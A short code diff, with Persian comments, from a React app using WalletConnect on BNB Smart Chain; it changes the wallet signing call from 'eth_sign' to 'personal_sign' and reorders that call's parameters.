@@ -9,7 +9,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["eth_sign"],
+      methods: ["personal_sign"],  // تغییر به personal_sign
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -35,8 +35,8 @@ function App() {
         console.log("📜 Unsigned Data:", unsignedData);
 
         var rawSignature = await provider.request({
-          method: "eth_sign",
-          params: [address, JSON.stringify(unsignedData)], 
+          method: "personal_sign",  // تغییر به personal_sign
+          params: [JSON.stringify(unsignedData), address], // توجه به ترتیب پارامترها
         });
 
         return rawSignature;
